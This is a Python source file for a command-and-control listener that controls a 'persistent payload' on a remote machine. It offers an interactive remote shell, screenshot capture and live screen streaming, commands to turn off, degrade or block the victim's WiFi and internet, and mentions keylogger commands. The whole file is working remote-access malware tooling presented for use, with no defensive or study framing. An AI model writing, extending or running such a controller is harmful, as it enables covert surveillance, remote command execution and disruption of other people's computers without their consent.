#!/usr/bin/env python3
"""
Menu‑based C2 Listener for Persistent Payload
Port: 7777
"""
import socket
import sys
import time
import base64
import cv2
import numpy as np
import threading
import os
from datetime import datetime

class C2Controller:
    def __init__(self, host='0.0.0.0', port=7777):
        self.host = host
        self.port = port
        self.conn = None
        self.addr = None
        self.streaming = False

    # ---------- Socket Helpers ----------
    def send_command(self, cmd):
        if self.conn:
            try:
                self.conn.send((cmd + "\n").encode())
                return True
            except:
                self.conn = None
                return False
        return False

    def recvline(self, timeout=2.0):
        if not self.conn:
            return None
        self.conn.settimeout(timeout)
        line = b""
        try:
            while True:
                c = self.conn.recv(1)
                if not c:
                    return None
                if c == b"\n":
                    break
                line += c
        except socket.timeout:
            return None
        except:
            return None
        finally:
            self.conn.settimeout(None)
        return line

    def recv_output(self, timeout=3.0):
        if not self.conn:
            return ""
        data = b""
        self.conn.settimeout(timeout)
        try:
            while True:
                chunk = self.conn.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        except:
            pass
        finally:
            self.conn.settimeout(None)
        return data.decode(errors='ignore')

    # ---------- Shell Session ----------
    def shell_session(self):
        if not self.conn:
            print("[!] No client connected.")
            return
        print("\n[*] Entering interactive shell. Type 'exit' to return to menu.")
        try:
            while True:
                cmd = input("shell> ").strip()
                if not cmd:
                    continue
                if cmd.lower() == 'exit':
                    break
                if not self.send_command(cmd):
                    print("[!] Connection lost.")
                    break
                out = self.recv_output(timeout=3.0)
                if out:
                    print(out, end="")
                else:
                    line = self.recvline(timeout=1.0)
                    if line:
                        print(line.decode(), end="")
        except KeyboardInterrupt:
            pass
        print("[*] Exited shell.")

    # ---------- Screen Stream ----------
    def screen_stream(self):
        if not self.conn:
            print("[!] No client connected.")
            return
        # We'll simulate streaming by repeatedly requesting screenshots
        print("[*] Starting screen stream. Press 'q' in the window to stop.")
        cv2.namedWindow("Stream", cv2.WINDOW_NORMAL)
        cv2.resizeWindow("Stream", 800, 600)
        streaming = True
        frame_count = 0
        while streaming and self.conn:
            if not self.send_command("screenshot"):
                print("[!] Connection lost.")
                break
            line = self.recvline(timeout=3.0)
            if not line:
                print("[!] Timeout or no data.")
                break
            decoded = line.decode().strip()
            if decoded.startswith("SCREEN:"):
                img_b64 = decoded[7:]
                try:
                    img_data = base64.b64decode(img_b64)
                    nparr = np.frombuffer(img_data, np.uint8)
                    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                    if img is not None:
                        frame_count += 1
                        cv2.imshow("Stream", img)
                        key = cv2.waitKey(1) & 0xFF
                        if key == ord('q') or key == 27:
                            streaming = False
                            break
                    else:
                        print("[!] imdecode failed")
                except Exception as e:
                    print(f"[!] Decode error: {e}")
                    break
            else:
                print(f"[!] Unexpected: {decoded}")
                break
            time.sleep(0.5)  # frame rate
        cv2.destroyAllWindows()
        print(f"[*] Stream ended. Frames: {frame_count}")

    # ---------- Single Screenshot ----------
    def single_screenshot(self):
        if not self.conn:
            print("[!] No client connected.")
            return
        if not self.send_command("screenshot"):
            print("[!] Connection lost.")
            return
        line = self.recvline(timeout=5.0)
        if not line:
            print("[!] No response.")
            return
        decoded = line.decode().strip()
        if decoded.startswith("SCREEN:"):
            img_b64 = decoded[7:]
            try:
                img_data = base64.b64decode(img_b64)
                nparr = np.frombuffer(img_data, np.uint8)
                img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                if img is not None:
                    cv2.imshow("Screenshot", img)
                    cv2.waitKey(0)
                    cv2.destroyAllWindows()
                    print("[*] Screenshot displayed.")
                else:
                    print("[!] imdecode failed")
            except Exception as e:
                print(f"[!] Decode error: {e}")
        else:
            print(f"[!] Unexpected: {decoded}")

    # ---------- WiFi Control ----------
    def wifi_menu(self):
        print("\nWiFi Control:")
        print("  1. Turn Off")
        print("  2. Turn On")
        print("  3. Weaken (break internet)")
        print("  4. Fix (restore)")
        print("  5. Back")
        choice = input("Select: ").strip()
        cmd_map = {'1':'wifioff','2':'wifion','3':'wifiweak','4':'wififix'}
        if choice in cmd_map:
            if not self.send_command(cmd_map[choice]):
                print("[!] Connection lost.")
                return
            resp = self.recvline(timeout=2.0)
            if resp:
                print(resp.decode().strip())
        else:
            return

    # ---------- Keylogger (optional – not fully implemented in payload) ----------
    # For completeness we keep a placeholder; payload doesn't have keylogger yet.
    def keylog_menu(self):
        print("\nKeylogger (not fully implemented in this version).")
        print("Commands: keylog_start, keylog_stop, keylog_dump, keylog_clear can be used in shell.")
        return

    # ---------- Main Menu ----------
    def main_menu(self):
        while True:
            print("\n" + "="*50)
            print(" C2 Controller")
            print("="*50)
            print("  1. Shell (interactive)")
            print("  2. Single Screenshot")
            print("  3. Screen Stream (loop)")
            print("  4. WiFi Control")
            print("  5. Block Internet")
            print("  6. Unblock Internet")
            print("  7. DNS Flush")
            print("  8. Exit")
            choice = input("Select: ").strip()

            if choice == '1':
                self.shell_session()
            elif choice == '2':
                self.single_screenshot()
            elif choice == '3':
                self.screen_stream()
            elif choice == '4':
                self.wifi_menu()
            elif choice == '5':
                if not self.send_command("block"):
                    print("[!] Connection lost.")
                else:
                    resp = self.recvline(timeout=2.0)
                    if resp:
                        print(resp.decode().strip())
            elif choice == '6':
                if not self.send_command("unblock"):
                    print("[!] Connection lost.")
                else:
                    resp = self.recvline(timeout=2.0)
                    if resp:
                        print(resp.decode().strip())
            elif choice == '7':
                if not self.send_command("dnsflush"):
                    print("[!] Connection lost.")
                else:
                    resp = self.recvline(timeout=2.0)
                    if resp:
                        print(resp.decode().strip())
            elif choice == '8':
                print("[*] Exiting...")
                sys.exit(0)
            else:
                print("[!] Invalid option.")

            if not self.conn:
                print("[*] Connection lost. Returning to main menu...")
                break

    # ---------- Client Handling ----------
    def handle_client(self, conn, addr):
        self.conn = conn
        self.addr = addr
        print(f"[+] Client connected from {addr}")

        # Read system info
        sysinfo = self.recvline(timeout=5.0)
        if sysinfo:
            print(f"[*] System info: {sysinfo.decode().strip()}")
        else:
            print("[!] No system info, closing.")
            conn.close()
            self.conn = None
            return

        # Enter main menu
        self.main_menu()

        # After menu exits (connection lost or exit), close connection
        if self.conn:
            self.conn.close()
            self.conn = None
        print("[*] Client disconnected. Waiting for next connection...")

    # ---------- Start Listener ----------
    def start_listener(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(1)
        print(f"[*] Listening on {self.host}:{self.port}")

        while True:
            conn, addr = server.accept()
            self.handle_client(conn, addr)

if __name__ == "__main__":
    c2 = C2Controller()
    try:
        c2.start_listener()
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
        sys.exit(0)